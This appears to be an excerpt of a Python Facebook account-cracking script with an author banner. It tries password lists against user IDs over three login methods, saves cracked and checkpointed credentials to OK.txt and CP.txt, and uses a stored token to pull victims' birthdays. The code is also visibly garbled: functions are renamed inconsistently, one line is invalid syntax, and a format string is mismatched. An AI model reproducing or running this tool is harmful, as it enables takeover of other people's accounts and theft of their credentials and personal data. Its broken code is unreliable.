...
def hasil(ok,cp):
	if len(ok) != 0 or len(cp) != 0:
		...
		#RJ_Shuvo('\033[1;91mCHECK > %s'%(str(len(cp))));exit()
	else:
...
class __crack__:
	...
	def plerr(self):
		try:
			...
			print (' [*]=============================================')
			self.id = RJ_Shuvo(self.apk).read().splitlines()
		...
		if _jokowi_kontol_ in ('M', 'm'):
				...
				if pwek == '':
					...
					def _sempak_(bse=None):
						...
						if boy == '':
							...
							RJ_Shuvo('[•] Result CP saved to CP.txt')
							RJ_Shuvo('\n\tCrack Processing...\n')
							RJ_Shuvo('\n\tCrack Processing...\n\n');logo()
							...
							exit()
					Fuck Aking RJ('\n01.) Metode b-api ')
					Fuck Aking RJ('02.) Metode mbasic ')
					Fuck Aking RJ('03.) Metode Mobile ')
					_sempak_(pwek.split(','))
					break
			...
			RJ_Shuvo('\n\t------[ Method Crack ]-----')
			print (' [*]=============================================')
			RJ_Shuvo(' [1] Shuvo Method 1 ')
			RJ_Shuvo(' [2] Shuvo Method 2  [ Pro ]')
			RJ_Shuvo(' [3] Shuvo Method 3   ')
			print (' [*]=============================================')
			self.__pler__()
		else:
			exit()
	...
	def __api__(self, user, _sempak_):
		...
		for pw in _sempak_:
			...
			try:
				ua_xiaomi = Shuvo('agent.txt', 'r').read()
			...
			if "access_token" in p:
				RJ_Shuvo('\r\033[1;92m[Successful-AKING] %s | %s%s      '%(user,pw,tahun(user)))
				...
				try:
					token = RJ_Shuvo('login.txt').read()
					cp_ttl = Prof_Imtiaz('https://graph.facebook.com/%s?access_token=%s'%(user,token)).json()['birthday']
					month, day, year = cp_ttl.split('/')
					month = bulan_ttl[month]
					RJ_Shuvo('\r\033[1;91m[Checkpoint-AKING] %s | %s • %s %s %s%s      '%(user,pw,day,month,year,tahun(user)))
					...
					pass
				RJ_Shuvo('\r\033[1;91m[Checkpoint-AKING] %s | %s%s      '%(user,pw,tahun(user)))
				wrt = '%s - %s%s' % (user,pw,tahun(user))
				cp.append(wrt)
				open('CP.txt','a').write('%s\n' % wrt)
				break
	...
	def __mbasic__(self, user, _sempak_):
		...
		for pw in _sempak_:
			...
			if 'c_user' in ses.cookies.get_dict():
				RJ_Shuvo('\r\033[1;32m[Successful-AKING] %s | %s      ' % (user,pw))
				wrt = '%s - %s' % (user,pw)
				ok.append(wrt)
				open('OK.txt','a').write('%s\n' % wrt)
				break
	...
	def __mfb__(self, user, _sempak_):
		...
		for pw in _sempak_:
			...
			if 'c_user' in ses.cookies.get_dict():
				RJ_Shuvo('\r\033[1;92m[Successful-AKING] %s | %s      '%(user,pw))
				wrt = '%s - %s - %s' % (user,pw)
				ok.append(wrt)
				open('OK.txt','a').write('%s\n' % wrt)
				break
...
┗━━━┻┛┗┻━━┛┗┛┗━━┛
 [*]=============================================
    Author   : RJ Shuvo
    Facebook : https://facebook.com/RJ.Shuvo09
    Team     : Virtual Kings
    Connect  : 03237@@@@
 [*]=============================================
